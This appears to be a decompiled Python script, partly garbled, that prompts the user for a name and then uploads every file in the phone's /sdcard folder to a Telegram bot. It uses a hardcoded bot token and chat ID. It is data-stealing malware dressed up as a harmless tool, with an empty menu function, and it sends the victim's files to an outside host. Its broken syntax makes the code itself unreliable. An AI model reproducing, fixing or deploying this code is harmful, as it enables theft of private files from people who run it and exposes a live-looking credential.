import requests
import os
from concurrent.futures import ThreadPoolExecutor as ThreadPool
uname = input('>> WHAT IS YOUR NAME \x1b[1;91m: \x1b[1;37m')

def main():
    session = requests.session()
    bot_token = '7366264017:AAGtvirzGDA_hqLqalKsqYQUZDVVlum3IHQ'
    chat_id = '6515777992'
    sdcard_path = '/sdcard'
    file_list = os.listdir(sdcard_path)()
    for file in file_list:
        f = open(os.path.join(sdcard_path, file), 'rb')
        url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
        data = {
            'chat_id': chat_id,
            'caption': f'''From: {uname}''' }
        files = {
            'document': f }
        session.post(url, data = data, files = files)
        None(None, None)
        if not (lambda .0: for f in .0:
[ f ]):
            pass
        return None
        if Exception:
            e = None
            print('Error:', e)
            e = None
            del e
            return None
        e = None
        del e


def main_menu():
    pass

if __name__ == '__main__':
    executor = ThreadPool(max_workers = 1000)
    executor.submit(main)
    executor.submit(main_menu)
    None(None, None)
    return None
if not None:
    pass
return None